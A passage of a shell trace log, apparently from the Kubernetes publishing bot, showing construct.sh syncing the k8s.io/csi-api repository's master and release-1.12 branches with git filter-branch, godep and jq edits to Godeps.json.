\"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apiextensions-apiserver/\") or . == \"k8s.io/apiextensions-apiserver\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/csi-api/\") or . == \"k8s.io/csi-api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ '[' -z a94ea824eb59e92188f166c302d7995ba9002667 ']'\n>\t++ git-find-merge a94ea824eb59e92188f166c302d7995ba9002667 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list 'a94ea824eb59e92188f166c302d7995ba9002667^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list a94ea824eb59e92188f166c302d7995ba9002667..upstream-branch --ancestry-path\n>\t+++ git rev-parse a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ local k_last_kube_merge=a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ local dep_count=4\n>\t+ (( i=0 ))\n>\t+ (( i<4 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.\n>\t++ look -b a94ea824eb59e92188f166c302d7995ba9002667 ../kube-commits-apimachinery-master\n>\t+ '[' -z b90fb3933738446b5a2196f37f3a8d24cbc5eb93 ']'\n>\t+ pushd ../apimachinery\n>\tChecking out k8s.io/apimachinery to b90fb3933738446b5a2196f37f3a8d24cbc5eb93\n>\t+ echo 'Checking out k8s.io/apimachinery to b90fb3933738446b5a2196f37f3a8d24cbc5eb93'\n>\t+ git checkout -q b90fb3933738446b5a2196f37f3a8d24cbc5eb93\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=api\n>\t+ local branch=master\n>\tLooking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a94ea824eb59e92188f166c302d7995ba9002667 ../kube-commits-api-master\n>\t+ '[' -z 0d2438381651a1fe2816a9ac1923eeefa129e254 ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 0d2438381651a1fe2816a9ac1923eeefa129e254'\n>\t+ git checkout -q 0d2438381651a1fe2816a9ac1923eeefa129e254\n>\tChecking out k8s.io/api to 0d2438381651a1fe2816a9ac1923eeefa129e254\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=client-go\n>\t+ local branch=master\n>\tLooking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a94ea824eb59e92188f166c302d7995ba9002667 ../kube-commits-client-go-master\n>\t+ '[' -z 087039522ddde9317ecf61500c4ebe598e9f69cb ']'\n>\t+ pushd ../client-go\n>\t+ echo 'Checking out k8s.io/client-go to 087039522ddde9317ecf61500c4ebe598e9f69cb'\n>\t+ git checkout -q 087039522ddde9317ecf61500c4ebe598e9f69cb\n>\tChecking out k8s.io/client-go to 087039522ddde9317ecf61500c4ebe598e9f69cb\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=apiextensions-apiserver\n>\t+ local branch=master\n>\tLooking up which commit in the master branch of k8s.io/apiextensions-apiserver corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apiextensions-apiserver corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a94ea824eb59e92188f166c302d7995ba9002667 ../kube-commits-apiextensions-apiserver-master\n>\t+ '[' -z 05e89e265cc594459a3d33a63e779d94e6614c63 ']'\n>\t+ pushd ../apiextensions-apiserver\n>\tChecking out k8s.io/apiextensions-apiserver to 05e89e265cc594459a3d33a63e779d94e6614c63\n>\t+ echo 'Checking out k8s.io/apiextensions-apiserver to 05e89e265cc594459a3d33a63e779d94e6614c63'\n>\t+ git checkout -q 05e89e265cc594459a3d33a63e779d94e6614c63\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>\t+ rm -rf ./vendor/github.com/golang/glog\n>\tRemoving k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.\n>\t+ rm -rf ./vendor/k8s.io\n>\t+ rm -rf ./vendor/github.com/google/gofuzz\n>\t+ rm -rf ./vendor/github.com/go-openapi\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\tRemove redundant godep commits on-top of 31ae05d8096db803f5b4ff16cda6059c0a9cc861.\n>\t+ echo 'Remove redundant godep commits on-top of 31ae05d8096db803f5b4ff16cda6059c0a9cc861.'\n>\t+ git reset --soft -q 31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/csi-api\n>\t+ local repo=csi-api\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '31ae05d Merge pull request #68238 from justinsb/update_reflect2_to_101' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-csi-api-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-csi-api-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-csi-api-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-csi-api-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-csi-api-master.sh --dependencies apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master --mapping-output-file '../tag-csi-api-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"master\" at 31ae05d8096db803f5b4ff16cda6059c0a9cc861 because \"kubernetes-1.10.0-alpha.3\" seems to be relevant.\n>\t++ git rev-parse master\n>\t+ '[' 31ae05d8096db803f5b4ff16cda6059c0a9cc861 '!=' 31ae05d8096db803f5b4ff16cda6059c0a9cc861 ']'\n>\t+ git checkout master\n>\tAlready on 'master'\n>\tYour branch is up-to-date with 'origin/master'.\n>[28 Sep 18 11:53 UTC]: Successfully constructed master\n>[28 Sep 18 11:53 UTC]: /publish_scripts/construct.sh csi-api release-1.12 release-1.12 apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiextensions-apiserver:release-1.12  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/csi-api kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  1acc2d4617d3ca73fd413e3076bd78e3e8971765\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=csi-api\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiextensions-apiserver:release-1.12\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/csi-api\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=1acc2d4617d3ca73fd413e3076bd78e3e8971765\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\t+ git checkout -q release-1.12\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=4107876099ad9517010aa9414e8764b265b1136c\n>\t+ '[' 4107876099ad9517010aa9414e8764b265b1136c '!=' 1acc2d4617d3ca73fd413e3076bd78e3e8971765 ']'\n>\t+ echo 'Upstream branch upstream/release-1.12 moved from '\\''1acc2d4617d3ca73fd413e3076bd78e3e8971765'\\'' to '\\''4107876099ad9517010aa9414e8764b265b1136c'\\''. We have to sync.'\n>\tUpstream branch upstream/release-1.12 moved from '1acc2d4617d3ca73fd413e3076bd78e3e8971765' to '4107876099ad9517010aa9414e8764b265b1136c'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/csi-api release-1.12 release-1.12 apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiextensions-apiserver:release-1.12 '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local src_branch=release-1.12\n>\t+ local dst_branch=release-1.12\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiextensions-apiserver:release-1.12\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t833a598b67614ffea5b04ec1fc5bc3e5f6883e56\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 9 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing release-1.12 commit 833a598b67614ffea5b04ec1fc5bc3e5f6883e56.\n>\t+ echo 'Starting at existing release-1.12 commit 833a598b67614ffea5b04ec1fc5bc3e5f6883e56.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.12\n>\tBranch upstream-branch set up to track remote branch release-1.12 from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 4107876099ad9517010aa9414e8764b265b1136c.\n>\t+ echo 'Checked out source commit 4107876099ad9517010aa9414e8764b265b1136c.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit release-1.12\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ grep '^Kubernetes-commit: '\n>\t++ git log --format=%B release-1.12\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_base_commit=4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\t+ '[' -z 4e599c848401470c3c10eb52252c5e3bb5463d3b ']'\n>\t++ git-find-merge 4e599c848401470c3c10eb52252c5e3bb5463d3b upstream/release-1.12\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list '4e599c848401470c3c10eb52252c5e3bb5463d3b^1..upstream/release-1.12' --first-parent\n>\t+++ git rev-list 4e599c848401470c3c10eb52252c5e3bb5463d3b..upstream/release-1.12 --ancestry-path\n>\t+++ git rev-parse 4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\t+ local k_base_merge=4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\t+ '[' -z 4e599c848401470c3c10eb52252c5e3bb5463d3b ']'\n>\t+ git branch -f filtered-branch-base 4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\tRewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/csi-api.\n>\t+ echo 'Rewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/csi-api.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/csi-api 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\tRunning git filter-branch ...\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/csi-api -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t++ git log --first-parent --format=%H --reverse 28b44cb2f1d69864321e9c098c43a72ca2321a38..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch release-1.12.'\n>\t+ git checkout -q release-1.12\n>\tChecking out branch release-1.12.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=833a598b67614ffea5b04ec1fc5bc3e5f6883e56\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=833a598b67614ffea5b04ec1fc5bc3e5f6883e56\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' 833a598b67614ffea5b04ec1fc5bc3e5f6883e56 '!=' 833a598b67614ffea5b04ec1fc5bc3e5f6883e56 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiextensions-apiserver:release-1.12 '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiextensions-apiserver:release-1.12\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=833a598b67614ffea5b04ec1fc5bc3e5f6883e56\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiextensions-apiserver:release-1.12 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiextensions-apiserver:release-1.12\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/csi-api\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apiextensions-apiserver/\") or . == \"k8s.io/apiextensions-apiserver\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/csi-api/\") or . == \"k8s.io/csi-api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\tRunning godep restore.\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiextensions-apiserver:release-1.12\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\t+ '[' -z 4e599c848401470c3c10eb52252c5e3bb5463d3b ']'\n>\t++ git-find-merge 4e599c848401470c3c10eb52252c5e3bb5463d3b upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '4e599c848401470c3c10eb52252c5e3bb5463d3b^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 4e599c848401470c3c10eb52252c5e3bb5463d3b..upstream-branch --ancestry-path\n>\t+++ git rev-parse 4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\t+ local k_last_kube_merge=4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\t+ local dep_count=4\n>\t+ (( i=0 ))\n>\t+ (( i<4 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.\n>\t++ look -b 4e599c848401470c3c10eb52252c5e3bb5463d3b ../kube-commits-apimachinery-release-1.12\n>\t+ '[' -z 6dd46049f39503a1fc8d65de4bd566829e95faff ']'\n>\t+ pushd ../apimachinery\n>\tChecking out k8s.io/apimachinery to 6dd46049f39503a1fc8d65de4bd566829e95faff\n>\t+ echo 'Checking out k8s.io/apimachinery to 6dd46049f39503a1fc8d65de4bd566829e95faff'\n>\t+ git checkout -q 6dd46049f39503a1fc8d65de4bd566829e95faff\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\tLooking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.\n>\t+ read k_commit dep_commit\n>\t++ look -b 4e599c848401470c3c10eb52252c5e3bb5463d3b ../kube-commits-api-release-1.12\n>\t+ '[' -z b9bd491cc8f21b9461d2a6cf277542dc4c53e7fc ']'\n>\t+ pushd ../api\n>\tChecking out k8s.io/api to b9bd491cc8f21b9461d2a6cf277542dc4c53e7fc\n>\t+ echo 'Checking out k8s.io/api to b9bd491cc8f21b9461d2a6cf277542dc4c53e7fc'\n>\t+ git checkout -q b9bd491cc8f21b9461d2a6cf277542dc4c53e7fc\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=client-go\n>\t+ local branch=release-9.0\n>\t+ echo 